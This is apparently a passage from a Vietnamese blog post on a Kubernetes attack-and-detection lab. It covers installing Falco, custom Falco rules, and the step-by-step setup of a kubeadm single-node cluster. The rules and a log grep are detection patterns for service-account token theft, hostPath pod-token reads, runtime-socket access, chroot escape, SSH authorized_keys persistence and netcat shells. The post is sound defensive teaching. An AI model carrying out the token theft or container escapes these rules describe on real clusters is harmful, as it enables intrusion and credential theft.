`helm repo add falcosecurity https://falcosecurity.github.io/charts helm repo update`

Cài vào namespace riêng:

```
kubectl create namespace falco --dry-run=client -o yaml | kubectl apply -f -

helm install falco falcosecurity/falco \
  -n falco \
  --version 8.0.5 \
  --set falcoctl.artifact.install.enabled=false \
  --set falcoctl.artifact.follow.enabled=false \
  --set tty=true
  

```

Test thử khi reverse shell

![](/assets/images/posts/Pasted%20image%2020260529231558.png)

Viết Custom rule detect log


```
cat > falco-vdt-rules.yaml <<'EOF'
customRules:
  vdt_rules.yaml: |-
    - rule: VDT Read App Service Account Token
      desc: Detect lab app reading its service account token
      condition: >
        open_read and container and
        fd.name contains "/run/secrets/kubernetes.io/serviceaccount/token" and
        k8s.ns.name in (prod, dev, platform, platform-system) and
        not k8s.pod.name startswith "calico-" and
        not k8s.pod.name startswith "coredns"
      output: >
        VDT detected service account token read
        (user=%user.name command=%proc.cmdline container=%container.name
        image=%container.image.repository pod=%k8s.pod.name ns=%k8s.ns.name file=%fd.name)
      priority: WARNING
      tags: [k8s, credential_access, vdt]

    - rule: VDT Read Mounted Node Pod Tokens
      desc: Detect reading projected pod tokens via hostPath-mounted kubelet pod directories
      condition: >
        open_read and container and
        fd.name contains "/node-pods" and fd.name contains "/token"
      output: >
        VDT detected pod token read through /node-pods hostPath
        (user=%user.name command=%proc.cmdline container=%container.name
        image=%container.image.repository pod=%k8s.pod.name ns=%k8s.ns.name file=%fd.name)
      priority: CRITICAL
      tags: [k8s, hostpath, credential_access, container_escape, vdt]

    - rule: VDT Container Runtime Socket Access
      desc: Detect access to container runtime sockets from lab containers
      condition: >
        (open_read or open_write) and container and
        k8s.ns.name in (dev, kube-system) and
        (fd.name contains "/run/containerd/containerd.sock" or
         fd.name contains "/var/run/docker.sock" or
         fd.name contains "/run/crio/crio.sock")
      output: >
        VDT detected container runtime socket access
        (user=%user.name command=%proc.cmdline container=%container.name
        image=%container.image.repository pod=%k8s.pod.name ns=%k8s.ns.name file=%fd.name)
      priority: CRITICAL
      tags: [k8s, runtime_socket, container_escape, vdt]

    - rule: VDT Suspicious Sidecar Writes Shared Volume
      desc: Detect suspicious writes to shared volume used by sidecar persistence demo
      condition: >
        open_write and container and
        k8s.ns.name=dev and
        fd.name startswith "/shared/"
      output: >
        VDT detected write to shared sidecar volume
        (user=%user.name command=%proc.cmdline container=%container.name
        image=%container.image.repository pod=%k8s.pod.name ns=%k8s.ns.name file=%fd.name)
      priority: WARNING
      tags: [k8s, persistence, sidecar, vdt]

    - rule: VDT Chroot To Host Filesystem
      desc: Detect chroot execution from lab container
      condition: >
        spawned_process and container and
        proc.name=chroot and
        k8s.pod.name in (node-maintenance, host-shell)
      output: >
        VDT detected chroot from container
        (user=%user.name command=%proc.cmdline container=%container.name
        image=%container.image.repository pod=%k8s.pod.name ns=%k8s.ns.name)
      priority: CRITICAL
      tags: [k8s, container_escape, host_access, vdt]

    - rule: VDT SSH Authorized Keys Modified From HostPath Pod
      desc: Detect SSH persistence by modifying authorized_keys from hostPath pod
      condition: >
        open_write and container and
        k8s.pod.name in (node-maintenance, host-shell) and
        fd.name contains "/.ssh/authorized_keys"
      output: >
        VDT detected SSH authorized_keys modification from hostPath pod
        (user=%user.name command=%proc.cmdline container=%container.name
        image=%container.image.repository pod=%k8s.pod.name ns=%k8s.ns.name file=%fd.name)
      priority: CRITICAL
      tags: [k8s, persistence, host_access, vdt]
EOF
```


Falco tập trung vào runtime behavior sau khi workload đã chạy. Các hành vi control-plane như impersonation, patch deployment, get secret qua Kubernetes API cần được giám sát bằng Kubernetes Audit Logs hoặc policy engine như Kyverno/Gatekeeper. Vì vậy trong demo, Falco được dùng để phát hiện RCE, token theft, hostPath abuse và chroot; còn Flag 3 được đề xuất phát hiện bằng audit log.



```
kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco -f --tail=0 \
  | grep --line-buffered -Ei 'VDT|netcat|remote code|token|node-pods|chroot|authorized|runtime|sidecar'
```

![](/assets/images/posts/Pasted%20image%2020260530144313.png)


![](/assets/images/posts/Pasted%20image%2020260530145333.png)



### III. Quá trình dựng lab

### Môi trường VM đã tạo

```text
Host: Windows + VMware Workstation
Attacker: Kali VM
Target Kubernetes node: Ubuntu Server 26.04 LTS VM
Hostname Ubuntu: k8s-node
Username Ubuntu: phucquan
IP Ubuntu: 192.168.221.131
Disk VM: 40GB, root filesystem hiện khoảng 26GB
Network: NAT VMware, Kali đã SSH được vào Ubuntu
```


### Các bước đã hoàn thành

1. Kali SSH thành công vào Ubuntu:

```bash
ssh phucquan@192.168.221.131
```

2. Cài các gói nền cần thiết:

```bash
sudo apt update
sudo apt install -y curl wget gnupg ca-certificates apt-transport-https
```

3. Tắt swap:

```bash
sudo swapoff -a
swapon --show
```

4. Bật kernel modules cần cho Kubernetes:

```bash
sudo modprobe overlay
sudo modprobe br_netfilter
```

5. Tạo file `/etc/modules-load.d/k8s.conf`:

```bash
sudo tee /etc/modules-load.d/k8s.conf <<EOF
overlay
br_netfilter
EOF
```

6. Bật sysctl networking cho Kubernetes:

```bash
sudo tee /etc/sysctl.d/k8s.conf <<EOF
net.bridge.bridge-nf-call-iptables = 1
net.bridge.bridge-nf-call-ip6tables = 1
net.ipv4.ip_forward = 1
EOF

sudo sysctl --system
```

7. Cài và cấu hình `containerd`:

```bash
sudo apt install -y containerd
sudo mkdir -p /etc/containerd
containerd config default | sudo tee /etc/containerd/config.toml >/dev/null
sudo sed -i 's/SystemdCgroup = false/SystemdCgroup = true/' /etc/containerd/config.toml
sudo systemctl restart containerd
sudo systemctl enable containerd
sudo systemctl status containerd
```

Trạng thái hiện tại: `containerd` đã `active (running)`.

![](/assets/images/posts/Pasted%20image%2020260524110425.png)


### Bước tiếp theo

Cài `kubeadm`, `kubelet`, `kubectl` từ repo Kubernetes chính thức, sau đó chạy `kubeadm init` để tạo single-node cluster.

![](/assets/images/posts/Pasted%20image%2020260524110736.png)

![](/assets/images/posts/Pasted%20image%2020260524111700.png)


### Cập nhật sau khi containerd active

Sau khi `containerd` đã `active (running)`, tiếp tục cài Kubernetes packages từ repo chính thức `pkgs.k8s.io`:

```bash
sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.33/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg
echo 'deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.33/deb/ /' | sudo tee /etc/apt/sources.list.d/kubernetes.list
sudo apt update
sudo apt install -y kubelet kubeadm kubectl
sudo apt-mark hold kubelet kubeadm kubectl
```

Kiểm tra version:

```bash
kubeadm version
kubectl version --client
kubelet --version
```

Kết quả hiện tại:

```text
kubeadm/kubelet/kubectl: v1.33.12
```

### Khởi tạo kubeadm single-node cluster

Chạy lệnh init cluster với Pod CIDR phù hợp Calico:

```bash
sudo kubeadm init --pod-network-cidr=192.168.0.0/16
```

Kết quả: Kubernetes control-plane đã init thành công.

Sau đó cấu hình kubeconfig cho user thường:

```bash
mkdir -p $HOME/.kube
sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
sudo chown $(id -u):$(id -g) $HOME/.kube/config
```

Kiểm tra ban đầu:

```bash
kubectl get nodes
kubectl get pods -A
```

Trạng thái ban đầu sau init:

```text
k8s-node   NotReady   control-plane   v1.33.12
CoreDNS    Pending
```

Nguyên nhân: cluster chưa có CNI.

### Cài Calico CNI

Cài Calico:

```bash
kubectl apply -f https://raw.githubusercontent.com/projectcalico/calico/v3.30.0/manifests/calico.yaml
```

Cho phép schedule workload lên control-plane vì đây là lab single-node:

```bash
kubectl taint nodes --all node-role.kubernetes.io/control-plane-
```

Kiểm tra lại:

```bash
kubectl get nodes
kubectl get pods -A
```

Trạng thái hiện tại:

```text
k8s-node   Ready   control-plane   v1.33.12

kube-system/calico-kube-controllers   1/1 Running
kube-system/calico-node               1/1 Running
kube-system/coredns                   1/1 Running
kube-system/etcd                      1/1 Running
kube-system/kube-apiserver            1/1 Running
kube-system/kube-controller-manager   1/1 Running
kube-system/kube-proxy                1/1 Running
kube-system/kube-scheduler            1/1 Running
```

Kết luận: kubeadm single-node cluster đã dựng thành công và sẵn sàng triển khai lab privilege escalation.


![](/assets/images/posts/Pasted%20image%2020260524122734.png)
